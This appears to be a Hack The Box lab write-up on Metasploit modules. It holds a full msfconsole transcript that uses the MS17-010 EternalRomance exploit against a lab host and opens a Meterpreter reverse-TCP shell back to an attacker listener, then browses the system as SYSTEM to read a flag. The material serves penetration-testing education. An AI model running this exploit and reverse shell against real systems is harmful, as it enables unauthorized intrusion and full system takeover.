
## Modules

- `modules` in metasploit are prepared scripts with perform a specific operation. These operations are already developed and tested in the real world scenario.
- `exploit` category in metasploit are so-called proof-of-concept(`POCs`) that can be used to exploit existing vulnerabilities.

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

---
## Questions and Solutions

- Use the Metasploit-Framework to exploit the target with **EternalRomance**. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.
	- **HTB{redacted}**


### Steps to Reproduce

```bash
$ msfconsole
msf > search eternalromance

Matching Modules
================

   #   Name                                  Disclosure Date  Rank    Check  Description
   -   ----                                  ---------------  ----    -----  -----------
   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1     \_ target: Automatic                .                .       .      .
   2     \_ target: PowerShell               .                .       .      .
   3     \_ target: Native upload            .                .       .      .
   4     \_ target: MOF upload               .                .       .      .
   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
   6     \_ AKA: ETERNALROMANCE              .                .       .      .
   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
   8     \_ AKA: ETERNALBLUE                 .                .       .      .
   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
   11    \_ AKA: ETERNALROMANCE              .                .       .      .
   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
   13    \_ AKA: ETERNALBLUE                 .                .       .      .


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.32.248
RHOSTS => 10.129.32.248
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.64
LHOST => 10.10.15.64
msf exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.15.64:4444 
[*] 10.129.32.248:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.32.248:445 - Built a write-what-where primitive...
[+] 10.129.32.248:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.32.248:445 - Selecting PowerShell target
[*] 10.129.32.248:445 - Executing the payload...
[+] 10.129.32.248:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.129.32.248
[*] Meterpreter session 1 opened (10.10.15.64:4444 -> 10.129.32.248:49673) at 2026-03-04 09:47:08 -0500

meterpreter > shell
Process 1008 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ..\..
cd ..\..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\

10/05/2020  05:43 PM    <DIR>          inetpub
07/16/2016  05:23 AM    <DIR>          PerfLogs
05/16/2022  04:08 AM    <DIR>          Program Files
05/16/2022  04:08 AM    <DIR>          Program Files (x86)
10/05/2020  05:51 PM    <DIR>          Users
10/05/2020  05:43 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  30,872,645,632 bytes free

C:\>cd Users    
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\Users

10/05/2020  05:51 PM    <DIR>          .
10/05/2020  05:51 PM    <DIR>          ..
10/05/2020  05:51 PM    <DIR>          .NET v2.0
10/05/2020  05:51 PM    <DIR>          .NET v2.0 Classic
10/05/2020  05:51 PM    <DIR>          .NET v4.5
10/05/2020  05:51 PM    <DIR>          .NET v4.5 Classic
10/05/2020  03:18 PM    <DIR>          Administrator
10/05/2020  05:51 PM    <DIR>          Classic .NET AppPool
11/20/2016  05:24 PM    <DIR>          Public
               0 File(s)              0 bytes
               9 Dir(s)  30,872,645,632 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\Users\Administrator\Desktop

05/16/2022  04:17 AM    <DIR>          .
05/16/2022  04:17 AM    <DIR>          ..
05/16/2022  03:19 AM                29 flag.txt
               1 File(s)             29 bytes
               2 Dir(s)  30,872,645,632 bytes free

C:\Users\Administrator\Desktop>more flag.txt
more flag.txt
HTB{redacted}
```